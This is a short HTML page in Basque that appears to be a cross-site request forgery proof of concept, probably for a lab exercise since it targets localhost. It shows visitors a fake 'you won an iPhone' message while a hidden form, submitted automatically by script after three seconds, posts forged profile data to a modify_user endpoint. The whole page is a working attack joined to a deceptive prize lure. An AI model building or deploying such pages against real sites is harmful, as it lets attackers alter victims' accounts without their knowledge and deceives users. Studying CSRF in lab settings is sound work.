<!DOCTYPE html>
<html>
<head>
    <title>Doako Zozketa</title>
</head>
<body>
    <h1>Zorionak! iPhone bat irabazi duzu</h1>
    <p>Itxaron mesedez, zure saria prestatzen ari gara...</p>

    <!-- CSRF erasorako formulario ezkutua -->
    <form id="csrfErasoa" action="http://localhost:81/modify_user?user=XXXXXXXXX" method="POST">
        <input type="hidden" name="Erabiltzaile" value="Erasoa ondo burututa">
        <input type="hidden" name="Izen_Abizen" value="Erasoa ondo burututa">
        <input type="hidden" name="Telefonoa" value="666666666">
        <input type="hidden" name="Jaio_Data" value="2000-01-01">
        <input type="hidden" name="Email" value="erasoa@adibidea.com">
    </form>

    <!-- Formularioa automatikoki bidaltzeko script-a -->
    <script>
        setTimeout(() => {
            document.getElementById('csrfErasoa').submit();
            alert('Saria bidali da!');
        }, 3000);
    </script>
</body>
</html>
